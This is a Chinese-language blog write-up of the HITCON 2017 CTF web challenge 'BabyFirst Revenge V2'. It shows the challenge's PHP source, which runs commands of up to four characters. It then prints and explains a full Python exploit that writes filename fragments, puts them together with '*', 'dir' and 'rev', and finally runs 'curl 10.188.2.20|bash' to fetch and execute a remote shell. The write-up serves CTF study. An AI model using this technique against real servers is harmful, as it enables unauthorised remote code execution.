<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[hitcon2017] BabyFirst Revenge V2复现 | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->

    <script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-69613510-1', 'auto');
    ga('send', 'pageview');

</script>


    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[hitcon2017] BabyFirst Revenge V2复现</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Nov 28, 2017
        
        
        •
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#hitcon" class="reserved">hitcon</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
    </p>
  </header>

  <article class="post-content">
  <p>分享本题自制Dockerfile：<a href="https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge-v2">Github</a> </p>

<p>这题相比于上一题 条件更加的苛刻了 只允许执行最多四个字符<br>
源码如下：</p>
<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">'/www/sandbox/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
    <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'reset'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">'/bin/rm -rf '</span> <span class="o">.</span> <span class="nv">$sandbox</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
</code></pre></div>
<p>那我们之前的生成 ls -t&gt;g 就不能按照最后一步 ls&gt;&gt;_ 来执行了</p>

<p>但是我们能不能还是按照 生成命令段文件 最后通过ls来拼接命令执行呢？</p>

<p>这里还是以分析Orange大大的exp为主：</p>

<p>Exp:</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
    <span class="c1"># generate "g&gt; ht- sl" to file "v"
</span>    <span class="s">'&gt;dir'</span><span class="p">,</span> 
    <span class="s">'&gt;sl'</span><span class="p">,</span> 
    <span class="s">'&gt;g</span><span class="err">\</span><span class="s">&gt;'</span><span class="p">,</span>
    <span class="s">'&gt;ht-'</span><span class="p">,</span>
    <span class="s">'*&gt;v'</span><span class="p">,</span>

    <span class="c1"># reverse file "v" to file "x", content "ls -th &gt;g"
</span>    <span class="s">'&gt;rev'</span><span class="p">,</span>
    <span class="s">'*v&gt;x'</span><span class="p">,</span>

    <span class="c1"># generate "curl orange.tw|python;"
</span>    <span class="c1"># generate "curl 10.188.2.20|bash"
</span>    <span class="s">'&gt;</span><span class="err">\</span><span class="s">;</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;sh</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;ba</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;</span><span class="err">\</span><span class="s">|</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;20</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;2.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
    <span class="s">'&gt;8.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;18</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;0.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;1</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;</span><span class="err">\</span><span class="s"> </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;rl</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
    <span class="s">'&gt;cu</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 

    <span class="c1"># got shell
</span>    <span class="s">'sh x'</span><span class="p">,</span> 
    <span class="s">'sh g'</span><span class="p">,</span> 
<span class="p">]</span>


<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:17528/?reset=1'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">4</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:17528/?cmd='</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
    <span class="k">print</span> <span class="n">i</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</code></pre></div>
<p>首先生成 ls -t &gt;g的命令文件，这里orange大大的方法真的巧妙到极致了！</p>

<ul>
<li><p>先了解一个小trick，<code class="prettyprint">*</code>在Linux中代表的是0或多个字符，比如<code class="prettyprint">ls *.txt</code> 就表示了列出本目录下所有后缀名为txt的文件，那假如单独执行一个<code class="prettyprint">*</code>会是什么效果？<br>
在本地尝试了一下 直接输入一个星号的话Linux首先会把当前目录下的所有文件按字典序排序一次，然后将排序的结果当作命令执行，如下：<br>
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/1.png" alt="🌰"><br>
那下图的也可以理解了：<br>
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/2.png" alt="🌰"><br>
因为*o匹配了 echo 和o，而他们的排序是echo在前，o在后 所以就会执行命令 echo o</p></li>
<li><p>再认识一下dir 这个命令在大多数系统中都是ls 的alias 但是有些系统中则没有<br>
为什么我们要用这个命令呢 因为之前说过ls 是alphabetically （字典序）那么dir就会排在ls结果的最前面 所以我们*之后dir也是排在最前面 也就充当了拼接文件名的角色</p></li>
<li><p>大概思路就出来了 我们要构造ls -t&gt;g的命令片段成几个文件名 但是其命令段的首字母不能在d的前面，也就是不能是 <strong>特殊符号 数字 abc</strong> 而且每一段不能超过两个字符，因为其余两个字符要分配给&gt;和\，如果你尝试一下构造 正常来说是没办法构造出无特殊符号打头的文件名 他总会排到dir的前面，然后更巧妙的地方来了 我们可以生成逆序的命令拼接起来，最后使用rev命令反向文件中的字符串！</p></li>
<li><p>根据之前我们对*的认识，我们可以将倒序的命令输入到v文件中，因为*v能匹配rev 和 v，也就是执行了 rev v命令，然后再将倒序之后的结果&gt;x文件中，这样*v&gt;x刚刚好是四个字符!</p></li>
<li><p>但是看到这里 你可能还会在尝试过程中发现问题，那就是逆序之后的命令段应该是 [dir,&gt;sl,&gt;g&gt;,&gt;t-] 那么这里会有一个问题 因为t的字母序比s后，所以ls之后应该是这样的：<br>
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/3.png" alt="Oops"><br>
解决方法是加多一个参数h，在ls中h是用作格式化l参数之后的存储量大小 使之更适合人类方式阅读 但是如果ls只带参数h的不带参数l话那这个参数是毫无意义的 如图：<br>
<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/4.png" alt="🌰"><br>
所以我们将&gt;t-改成&gt;ht-就能解决字典序的问题了</p></li>
<li><p>接下来的问题就回到了babyfirst-revenge的情况了</p></li>
</ul>

<p>参考:<br>
<a href="https://github.com/orangetw/My-CTF-Web-Challenges">https://github.com/orangetw/My-CTF-Web-Challenges</a></p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
